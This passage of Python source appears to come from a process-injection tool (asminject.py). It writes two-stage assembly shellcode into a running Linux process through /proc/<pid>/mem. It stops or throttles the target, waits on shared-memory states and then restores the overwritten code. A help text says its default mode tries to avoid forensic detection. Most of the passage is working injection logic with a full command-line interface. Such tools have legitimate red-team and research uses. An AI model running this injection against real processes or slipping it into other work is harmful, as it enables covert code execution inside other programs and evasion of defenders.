    stage2 = assemble(stage2_source_code, injection_params, library_bases, replacements=stage2_replacements)
    
    # make sure that the read/execute block will be big enough to hold the payload
    if not stage2:
        log_error(f"Failed to assemble the selected payload. Rerun with --debug for additional information.", ansi=injection_params.ansi)
        sys.exit(1)
        
    stage2_real_size = len(stage2)
    
    if injection_params.read_execute_block_size < stage2_real_size:
        existing_rx_block_size = injection_params.read_execute_block_size
        injection_params.read_execute_block_size = stage2_real_size
        if (injection_params.read_execute_block_size % injection_params.allocation_unit_size) > 0:
            while (injection_params.read_execute_block_size % injection_params.allocation_unit_size) > 0:
                injection_params.read_execute_block_size += 1
        injection_params.stage2_size = injection_params.read_execute_block_size
        if injection_params.existing_read_execute_address:
            log_error(f"The selected payload is too large to fit into the existing read/execute block. It would require a block size of {hex(injection_params.read_execute_block_size)} bytes, but the existing block is only {hex(existing_rx_block_size)} bytes", ansi=injection_params.ansi)
            sys.exit(1)
        else:
            log_warning(f"Increased read/execute block size to {hex(injection_params.read_execute_block_size)} due to the size of the payload", ansi=injection_params.ansi)
                           
    if not stage2:
        log_error(f"Validation assembly of stage 2 failed. Please verify that all required parameters and offset lists have been provided. Rerun with --debug for additional information.'", ansi=injection_params.ansi)
        sys.exit(1)
    log("Validation assembly of stage 2 succeeded", ansi=injection_params.ansi)

    if injection_params.stop_method == "sigstop":
        log("Sending SIGSTOP", ansi=injection_params.ansi)
        os.kill(injection_params.pid, signal.SIGSTOP)
        while True:
            with open(f"/proc/{injection_params.pid}/stat") as stat_file:
                state = stat_file.read().split(" ")[2]
            if state in ["T", "t"]:
                break
            log("Waiting for process to stop", ansi=injection_params.ansi)
            time.sleep(0.1)
    elif injection_params.stop_method == "cgroup_freeze":
        log(f"Freezing process {injection_params.pid} using directory {injection_params.freeze_dir}", ansi=injection_params.ansi)
        os.mkdir(injection_params.freeze_dir)
        with open(injection_params.freeze_dir + "/tasks", "w") as task_file:
            task_file.write(str(injection_params.pid))
        with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
            state_file.write("FROZEN\n")
        while True:
            with open(injection_params.freeze_dir + "/freezer.state") as state_file:
                if state_file.read().strip() == "FROZEN":
                    break
            log("Waiting for process to freeze", ansi=injection_params.ansi)
            time.sleep(0.1)
        log("Process is frozen", ansi=injection_params.ansi)
    elif injection_params.stop_method == "slow":
        log("Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...", ansi=injection_params.ansi)
        try:
            injection_params.set_dynamic_process_info_vars()
            
            output_process_priority_and_affinity(injection_params, "Initial")
        except Exception as e:
            log_error(f"Couldn't get process information for slowing: {e}", ansi=injection_params.ansi)
            sys.exit(1)  
        try:
            set_process_priority_and_affinity(injection_params, injection_params.high_priority_nice, injection_params.low_priority_nice, injection_params.shared_affinity, injection_params.shared_affinity)
            injection_params.set_dynamic_process_info_vars()
            output_process_priority_and_affinity(injection_params, "Pre-injection")

        except Exception as e:
            log_error(f"Couldn't set process information for 'slow' mode: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    else:
        log.warn("We're not going to stop the process first!", ansi=injection_params.ansi)

    stack_backup_address = 0
    code_backup_address = 0

    stack_backup = b''
    code_backup = b''
    communication_address_backup = b''
    current_state = None
    
    continue_executing = True
    try:
        got_initial_syscall_data = False
        syscall_check_result = None
        instruction_pointer = 0
        stack_pointer = 0
        while not got_initial_syscall_data:
            syscall_check_result = get_syscall_values(injection_params, injection_params.pid)
            instruction_pointer = syscall_check_result[injection_params.instruction_pointer_register_name]
            stack_pointer = syscall_check_result[injection_params.stack_pointer_register_name]
            if instruction_pointer == 0 or stack_pointer == 0:
                log_error("Couldn't get current syscall data", ansi=injection_params.ansi)
                time.sleep(SLEEP_TIME_WAITING_FOR_SYSCALLS)
            else:
                got_initial_syscall_data = True
        log(f"{injection_params.instruction_pointer_register_name}: {hex(instruction_pointer)}", ansi=injection_params.ansi)
        log(f"{injection_params.stack_pointer_register_name}: {hex(stack_pointer)}", ansi=injection_params.ansi)
        
        if continue_executing:
            log(f"Using: {hex(injection_params.state_ready_for_shellcode_write)} for 'ready for shellcode write' state value", ansi=injection_params.ansi)
            log(f"Using: {hex(injection_params.state_shellcode_written)} for 'shellcode written' state value", ansi=injection_params.ansi)
            #log(f"Using: {hex(injection_params.state_ready_for_memory_restore)} for 'ready for memory restore' state value", ansi=injection_params.ansi)
            
            stage_1_code = ""
            with open(stage1_path, "r") as stage1_code:
                stage_1_code = stage1_code.read()
            
            stage1_replacements = {}
            stage1_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
            stage1_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(stack_pointer - injection_params.stack_backup_size)}"
            stage1_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
            stage1_replacements['[VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]'] = f"{injection_params.state_ready_for_shellcode_write}"
            stage1_replacements['[VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE]'] = f"{injection_params.state_shellcode_written}"
            stage1_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
            stage1_replacements['[VARIABLE:READ_EXECUTE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_execute_block_size}"
            stage1_replacements['[VARIABLE:READ_WRITE_BLOCK_SIZE:VARIABLE]'] = f"{injection_params.read_write_block_size}"
            stage1_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
            stage1_replacements['[VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]'] = f"{injection_params.stage_sleep_seconds}"
            stage1_replacements['[VARIABLE:EXISTING_STACK_BACKUP_LOCATION_OFFSET:VARIABLE]'] = f"{injection_params.existing_stack_backup_location_offset}"
            stage1_replacements['[VARIABLE:NEW_STACK_LOCATION_OFFSET:VARIABLE]'] = f"{injection_params.cpu_state_size + injection_params.existing_stack_backup_location_size + injection_params.new_stack_location_offset}"
            if injection_params.existing_read_execute_address:
                log_warning(f"Attempting to reuse existing read/execute block at {hex(injection_params.existing_read_execute_address)}")
                stage1_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{hex(injection_params.existing_read_execute_address)}"
                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-use_existing_read-execute.s:FRAGMENT]")
            else:
                stage_1_code = stage_1_code.replace("[READ_EXECUTE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-allocate_read-execute.s:FRAGMENT]")
            if injection_params.existing_read_write_address:
                log_warning(f"Attempting to reuse existing read/write block at {hex(injection_params.existing_read_write_address)}")
                stage1_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{injection_params.existing_read_write_address}"
                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-use_existing_read-write.s:FRAGMENT]")
            else:
                stage_1_code = stage_1_code.replace("[READ_WRITE_ALLOCATE_OR_REUSE]", "[FRAGMENT:stage1-allocate_read-write.s:FRAGMENT]")
            
            
            stage1 = assemble(stage_1_code, injection_params, library_bases, replacements=stage1_replacements)

            if not stage1:
                continue_executing = False
                log_error("Assembly of stage 1 failed - will not attempt to inject into process", ansi=injection_params.ansi)
            else:
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    # back up the code we're about to overwrite
                    code_backup_address = instruction_pointer
                    mem.seek(code_backup_address)
                    code_backup = mem.read(len(stage1))

                    # back up the part of the stack that the shellcode will clobber
                    #stack_backup_address = stack_pointer - injection_params.stack_backup_size
                    #mem.seek(stack_backup_address)
                    #stack_backup = mem.read(injection_params.stack_backup_size)
                    #output_memory_block_data(injection_params, f"Stack backup ({hex(stack_backup_address)})", stack_backup)
                    
                    
                    # back up the data at the communication address
                    mem.seek(communication_address)
                    communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                    output_memory_block_data(injection_params, f"Communication address backup ({hex(communication_address)})", communication_address_backup)
                    
                    # Set the "memory restored" state variable to match the first 4 bytes of the backed up communications address data
                    injection_params.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
                    #log(f"Will specify {hex(injection_params.state_shellcode_written)} @ {hex(communication_address)} as the 'memory restored' value", ansi=injection_params.ansi)
                    log(f"Using: {hex(injection_params.state_ready_for_memory_restore)} for 'ready for memory restore' state value", ansi=injection_params.ansi)

                    # write the primary shellcode
                    mem.seek(instruction_pointer)
                    mem.write(stage1)

                log(f"Wrote first stage shellcode at {hex(instruction_pointer)} in target process {injection_params.pid}", ansi=injection_params.ansi)

        if injection_params.pause_before_resume:
            input("Press Enter to resume the target process")

        if injection_params.stop_method == "sigstop":
            log("Continuing process", ansi=injection_params.ansi)
            os.kill(injection_params.pid, signal.SIGCONT)
        elif injection_params.stop_method == "cgroup_freeze":
            log("Thawing process", ansi=injection_params.ansi)
            with open(injection_params.freeze_dir + "/freezer.state", "w") as state_file:
                state_file.write("THAWED\n")

            # put the task back in the root cgroup
            with open("/sys/fs/cgroup/freezer/tasks", "w") as task_file:
                task_file.write(str(injection_params.pid))

            # cleanup
            os.rmdir(injection_params.freeze_dir)
        elif injection_params.stop_method == "slow":
            log("Returning to normal time", ansi=injection_params.ansi)
            try:
                injection_params.set_dynamic_process_info_vars()
                output_process_priority_and_affinity(injection_params, "Post-injection")
                set_process_priority_and_affinity(injection_params, injection_params.asminject_priority_original, injection_params.target_priority_original, injection_params.target_affinity_original, injection_params.asminject_affinity_original)
                injection_params.set_dynamic_process_info_vars()
                output_process_priority_and_affinity(injection_params, "Restored")
            except Exception as e:
                log_error(f"Couldn't set process information to revert from 'slow' mode: {e}", ansi=injection_params.ansi)
                sys.exit(1)

        if continue_executing:
            stage2 = None
            stage2_replacements['[VARIABLE:INSTRUCTION_POINTER:VARIABLE]'] = f"{instruction_pointer}"
            stage2_replacements['[VARIABLE:STACK_POINTER:VARIABLE]'] = f"{stack_pointer}"
            stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
            stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
            stage2_replacements['[VARIABLE:STACK_POINTER_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(stack_pointer - injection_params.stack_backup_size)}"
            log(f"Waiting for stage 1 to indicate that it has allocated additional memory and is ready for the script to write stage 2", ansi=injection_params.ansi)
            current_state = wait_for_communication_state(injection_params, injection_params.pid, communication_address, injection_params.state_ready_for_shellcode_write)
            log_success(f"Read/execute base address: {hex(current_state.read_execute_address)}")
            log_success(f"Read/execute base address: {hex(current_state.read_write_address)}")
            stage2_replacements['[VARIABLE:READ_EXECUTE_ADDRESS:VARIABLE]'] = f"{current_state.read_execute_address}"
            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address}"
            stage2_replacements['[VARIABLE:EXISTING_STACK_BACKUP_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size + injection_params.existing_stack_backup_location_offset}"
            stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size + injection_params.existing_stack_backup_location_size + injection_params.new_stack_location_offset}"
            stage2_replacements['[VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size + injection_params.existing_stack_backup_location_size + injection_params.new_stack_size + injection_params.arbitrary_read_write_data_location_offset}"
            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{current_state.read_write_address + injection_params.read_write_block_size - 8}"
            
            

            stage2 = assemble(stage2_source_code, injection_params, library_bases, replacements=stage2_replacements)
                
            
            if not stage2:
                continue_executing = False
            else:
                log(f"Writing stage 2 to {hex(current_state.read_execute_address)} in target memory", ansi=injection_params.ansi)
                # write stage 2
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    mem.seek(current_state.read_execute_address)
                    mem.write(stage2)
                    
                    if injection_params.pause_before_launching_stage2:
                        input("Press Enter to proceed with launching stage 2")
                    
                    # Give stage 1 the OK to proceed
                    log(f"Writing {hex(injection_params.state_shellcode_written)} to {hex(communication_address)} in target memory to indicate stage 2 has been written to memory", ansi=injection_params.ansi)
                    mem.seek(communication_address)
                    ok_val = struct.pack('I', injection_params.state_shellcode_written)
                    mem.write(ok_val)
                    log_success("Stage 2 proceeding", ansi=injection_params.ansi)
                
                if injection_params.restore_delay > 0.0:
                    log(f"Waiting {injection_params.restore_delay} second(s) before starting memory restore check", ansi=injection_params.ansi)
                    time.sleep(injection_params.restore_delay)
                log(f"Waiting for stage 2 to indicate that it is ready for process memory to be restored", ansi=injection_params.ansi)
                current_state = wait_for_communication_state(injection_params, injection_params.pid, communication_address, injection_params.state_ready_for_memory_restore)
                if injection_params.pause_before_memory_restore:
                    input("Press Enter to proceed with memory restoration")
                log("Restoring original memory content", ansi=injection_params.ansi)
                with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
                    mem.seek(code_backup_address)
                    mem.write(code_backup)

                    # stack restore
                    #mem.seek(stack_backup_address)
                    #current_stack_backup = mem.read(injection_params.stack_backup_size)
                    #output_memory_block_data(injection_params, f"Stack backup location after shellcode execution ({hex(stack_backup_address)})", current_stack_backup)

                    #mem.seek(stack_backup_address)
                    #mem.write(stack_backup)
                    
                    #mem.seek(stack_backup_address)
                    #current_stack_backup = mem.read(injection_params.stack_backup_size)
                    #output_memory_block_data(injection_params, f"Stack backup location after memory restore ({hex(stack_backup_address)})", current_stack_backup)
                    
                    # communication address restore
                    
                    mem.seek(communication_address)
                    current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                    output_memory_block_data(injection_params, f"Communication address location after shellcode execution ({hex(communication_address)})", current_communication_address_backup)

                    if injection_params.pause_after_memory_restore:
                        input("Press Enter to restore the communications address backup and allow the inner payload to execute")

                    mem.seek(communication_address)
                    mem.write(communication_address_backup)
                    
                    mem.seek(communication_address)
                    current_communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                    output_memory_block_data(injection_params, f"Communication address location after memory restore ({hex(communication_address)})", current_communication_address_backup)
                        
    except KeyboardInterrupt as ki:
        log_warning(f"Operator cancelled the injection attempt", ansi=injection_params.ansi)
        continue_executing = False
    
    log_success("Done!", ansi=injection_params.ansi)
    if not injection_params.deallocate_memory and current_state:
        log_success(f"To reuse the existing read/write and read execute memory allocated during this injection attempt, include the following options in your next asminject.py command: --use-read-execute-address {hex(current_state.read_execute_address)} --use-read-execute-size {hex(injection_params.read_execute_block_size)} --use-read-write-address {hex(current_state.read_write_address)} --use-read-write-size {hex(injection_params.read_write_block_size)}", ansi=injection_params.ansi)

def parse_command_line_numeric_value(v):
    result = None
    if len(v) > 2 and v[0:2].lower() == "0x":
        try:
            result = int(v[2:], 16)
        except Exception as e:
            log_error(f"Couldn't parse '{v}' as a hexadecimal integer: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    else:
        try:
            result = int(v)
        except Exception as e:
            log_error(f"Couldn't parse '{v}' as a decimal integer: {e}", ansi=injection_params.ansi)
            sys.exit(1)
    return result

# begin: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

# end: https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse

if __name__ == "__main__":
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Inject arbitrary assembly code into a live process")

    parser.add_argument("pid", metavar="process_id", type=int,
        help="The pid of the target process")

    parser.add_argument("asm_path", metavar="payload_path", type=str,
        help="Path to the assembly code that should be injected")

    parser.add_argument("--relative-offsets", action='append', nargs='*', required=False,
        help="Path to the list of relative offsets referenced in the assembly code. May be specified multiple times to reference several files. Generate on a per-binary basis using the following command, e.g. for libc-2.31: # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d\" \" -f3,9")

    # parser.add_argument("--relative-offsets-from-binaries",type=str2bool, nargs='?',
    #    const=True, default=False,
    #    help="Read relative offsets from the binaries referred to in /proc/<pid>/maps instead of a text file. This will *only* work if the target process is not running in a container, or if the container has the exact same executable and library versions as the host or container where asminject.py is running. Requires that the elftools Python library be installed on the system where asminject.py is running.")
    
    parser.add_argument("--non-pic-binary", action='append', nargs='*', required=False,
        help="Regular expression identifying one or more executables/libraries that do *not* use position-independent code, such as Python 3.x")

    parser.add_argument("--stop-method",
        choices=["slow", "sigstop", "cgroup_freeze", "none"],
        default="slow",
        help="How to stop the target process prior to shellcode injection. \
              'sigstop' uses the built-in Linux process suspension mechanism, and can have side-effects. \
              'cgroup_freeze' requires root, and only operates in environments with cgroups.\
              'slow' (default) attempts to avoid forensic detection and side-effects of suspending a process by \
              temporarily setting the priority of the target process to the lowest possible value, \
              and the priority of asminject.py to the highest possible value. \
              'none' leaves the target process running as-is and is likely to cause race conditions.")
    
    # parser.add_argument("--inject-method",
        # choices=["wait-syscall", "overwrite-specific"], default="wait-syscall",
        # help="Code-injection technique to use: wait for a syscall and overwrite the return address (like dlinject.py), or pre-emptively overwrite a specific function \
              # Default: wait-syscall.")
    
    parser.add_argument("--arch",
        #choices=["x86-32", "x86-64", "arm32", "aarch64"], default="x86-64",
        choices=["x86-64", "arm32"], default="x86-64",
        help="Processor architecture for the injected code. \
              Default: x86-64.")
            
    parser.add_argument("--var",action='append',nargs=2, type=str,
        help="Specify a custom variable for use by the stage 2 code, e.g. --var pythoncode \"print('OK')\". May be specified multiple times for different variables.")
    
    parser.add_argument("--plaintext", type=str2bool, nargs='?',
        const=True, default=False,
        help="Disable ANSI formatting for console output")
    
    parser.add_argument("--pause-before-resume", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before resuming/unfreezing the target process")

    parser.add_argument("--pause-before-launching-stage2", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before giving the stage 1 payload the go-ahead to launch stage 2")
        
    parser.add_argument("--pause-before-memory-restore", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input before restoring memory")
    
    parser.add_argument("--pause-after-memory-restore", type=str2bool, nargs='?',
        const=True, default=False,
        help="Prompt for input after restoring memory, but before signalling the shellcode to proceed")
    
    parser.add_argument("--do-not-deallocate", type=str2bool, nargs='?',
        const=True, default=False,
        help="Do not deallocate the read/write data block when the payload finishes (for reuse using --use-read-write-address)")
    
    parser.add_argument("--use-read-execute-address", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, use this existing block of memory for read/execute data instead of allocating a new one")

    parser.add_argument("--use-read-execute-size", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, assume this size for the existing block of read/execute memory")

    parser.add_argument("--use-read-write-address", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, use this existing block of memory for read/write data instead of allocating a new one")

    parser.add_argument("--use-read-write-size", type=parse_command_line_numeric_value, 
        help="When injecting into a process that's already been injected into, assume this size for the existing block of read/write memory")

    parser.add_argument("--precompiled", type=str, 
        help="Path to a precompiled binary shellcode payload to embed and launch (requires use of execute_precompiled.s or execute_precompiled_threaded.s as the stage 2 payload)")

    # parser.add_argument("--clear-memory-on-exit", type=str2bool, nargs='?',
        # const=True, default=False,
        # help="Set all bytes in the read/execute and read/write memory to 0x00 after the payload has finished executing")

    # parser.add_argument("--obfuscate", type=str2bool, nargs='?',
        # const=True, default=False,
        # help="Enable code obfuscation")

    parser.add_argument("--preserve-temp-files", type=str2bool, nargs='?',
        const=True, default=False,
        help="Do not delete temporary files created during the assembling and linking process")
        
    parser.add_argument("--debug", type=str2bool, nargs='?',
        const=True, default=False,
        help="Enable debugging messages")
        
    args = parser.parse_args()

    injection_params = asminject_parameters()
    
    if args.var:
        for var_set in args.var:
            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}:VARIABLE]"] = var_set[1]
            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}.length:VARIABLE]"] = str(len(var_set[1]))
            

    injection_params.base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
    injection_params.pid = args.pid
    injection_params.set_architecture(args.arch)
    injection_params.asm_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, args.asm_path)
    injection_params.stop_method = args.stop_method
    injection_params.pause_before_resume = args.pause_before_resume
    injection_params.pause_before_launching_stage2 = args.pause_before_launching_stage2
    injection_params.pause_before_memory_restore = args.pause_before_memory_restore    
    injection_params.pause_after_memory_restore = args.pause_after_memory_restore    
    injection_params.ansi = not args.plaintext
    injection_params.enable_debugging_output = args.debug
    
    if args.do_not_deallocate:
        injection_params.deallocate_memory = False
    
    if args.use_read_execute_address:
        injection_params.existing_read_execute_address = args.use_read_execute_address
    
    if args.use_read_execute_size:
        injection_params.read_execute_block_size = args.use_read_execute_size
    
    if args.use_read_write_address:
        injection_params.existing_read_write_address = args.use_read_write_address
    
    if args.use_read_write_size:
        injection_params.read_write_block_size = args.use_read_write_size
    
    if args.preserve_temp_files:
        injection_params.delete_temp_files = False

    if args.precompiled:
        injection_params.precompiled_shellcode = os.path.abspath(args.precompiled)
    
    # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > offsets-libc-2.31.so.txt
    if args.relative_offsets:
        if len(args.relative_offsets) > 0:
            for elem in args.relative_offsets:
                for offsets_path in elem:
                    if offsets_path.strip() != "":
                        reloff_abs_path = os.path.abspath(offsets_path)
                        with open(reloff_abs_path) as offsets_file:
                            for line in offsets_file.readlines():
                                line_array = line.strip().split(" ")
                                offset_name = line_array[1].strip()
                                if offset_name in injection_params.relative_offsets.keys():
                                    log_warning(f"The offset '{offset_name}' is redefined in '{reloff_abs_path}'", ansi=args.plaintext)
                                offset_value = int(line_array[0], 16)
                                if offset_value > 0:
                                    injection_params.relative_offsets[offset_name] = offset_value
                                else:
                                    if injection_params.enable_debugging_output:
                                        log_warning(f"Ignoring offset '{offset_name}' in '{reloff_abs_path}' because it has a value of zero", ansi=args.plaintext)
    
    if len(injection_params.relative_offsets) < 1:
        log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
    
    if args.non_pic_binary:
        if len(args.non_pic_binary) > 0:
            for elem in args.non_pic_binary:
                for pb in elem:
                    if pb.strip() != "":
                        if pb not in injection_params.non_pic_binaries:
                            injection_params.non_pic_binaries.append(pb)

    asminject(injection_params)
